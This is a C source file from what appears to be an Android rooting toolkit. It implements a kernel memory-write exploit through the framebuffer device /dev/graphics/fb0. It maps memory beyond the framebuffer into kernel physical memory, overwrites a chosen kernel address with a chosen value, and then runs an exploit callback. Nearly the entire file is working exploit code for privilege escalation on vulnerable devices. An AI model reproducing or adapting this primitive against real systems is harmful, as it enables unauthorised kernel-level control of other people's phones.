/*
 * Based on kernelchopper.c <http://forum.xda-developers.com/showthread.php?p=40873964 
 *
 * Copyright (C) 2013 Hiroyuki Ikezoe
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 *
 */

#include <stdint.h>
#include <stdio.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <linux/fb.h>

#include "fb_mem.h"

#define FB_DEVICE "/dev/graphics/fb0"

#define KERNEL_VIRT_ADDRESS     0xc0000000
#define KERNEL_PHYS_ADDRESS     0x80000000
#define MAPPED_BASE             0x10000000

static unsigned long int kernel_phys_offset = 0;

static void *
convert_to_mmaped_address(void *address, void *mmap_base_address)
{
  return mmap_base_address + (uint32_t)address - KERNEL_VIRT_ADDRESS + kernel_phys_offset;
}

bool
fb_mem_write_value_at_address(unsigned long int address, int value)
{
  void *mmap_address = NULL;
  int *write_address;
  int fd;
  struct fb_fix_screeninfo info;
  int i;

  fd = open(FB_DEVICE, O_RDWR);
  if (fd < 0) {
    printf("Failed to open " FB_DEVICE " due to %s\n", strerror(errno));
    return false;
  }

  if (ioctl(fd, FBIOGET_FSCREENINFO, (void *)&info) != 0) {
    printf("Failed to get screen info due to %s\n", strerror(errno));
    close(fd);

    return false;
  }

  mmap_address = mmap((void *)MAPPED_BASE, (0x100000000 - KERNEL_PHYS_ADDRESS),
                      PROT_READ|PROT_WRITE, MAP_SHARED|MAP_FIXED,
                      fd, KERNEL_PHYS_ADDRESS + info.smem_len);

  if (mmap_address == MAP_FAILED) {
    printf("Failed to mmap due to %s\n", strerror(errno));

    close(fd);
    return false;
  }

  write_address = convert_to_mmaped_address((void*)address, mmap_address);
  *write_address = value;

  munmap(mmap_address, (0x100000000 - KERNEL_PHYS_ADDRESS));

  close(fd);

  return true;
}

bool
fb_mem_run_exploit(unsigned long int address, int value,
                   bool(*exploit_callback)(void* user_data), void *user_data)
{
  if (!fb_mem_write_value_at_address(address, value)) {
    return false;
  }

  return exploit_callback(user_data);
}

void
fb_mem_set_kernel_phys_offset(unsigned long int offset)
{
  kernel_phys_offset = offset;
}
